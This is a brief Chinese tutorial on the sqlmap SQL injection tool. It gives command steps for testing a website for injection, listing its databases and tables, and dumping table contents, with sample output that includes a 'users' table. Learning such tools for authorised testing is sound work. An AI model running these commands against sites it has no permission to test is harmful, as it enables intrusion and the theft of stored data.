SQLMAP工具的使用

SQLMAP工具的使用

  • 数据库：集中存放某一领域的所有相关数据的数据表
  • 数据表：存放具别数据的”表格“，一个数据库通常包含多个数据表，每个数据表存放特定数据
  • 字段值：数据表中某一列具体数据的名称

SQLMAP实操

  1. 测试是否存在漏洞

    sqlmap -u "想要测试的网站"

    出现以下类似提示说明该网站存在不同类型sql注入的漏洞

2.测试当前数据库名字

​ 语法：sqlmap -u "测试的网站" --dbs

​ 出现以下内容表示查询到四个数据库

3.测试指定数据库中的数据表有几个

语法：sqlmap -u "测试的网站" -D "数据库名" --tables

出现以下内容表示查询到三个数据表

Database: company_website
[3 tables]
+—————+
| articles |
| company_intro |
| users |
+—————+

4.测试指定数据表中的数据

语法：sqlmap -u "测试的网站" -D "数据库名" -T 数据表名 --dump
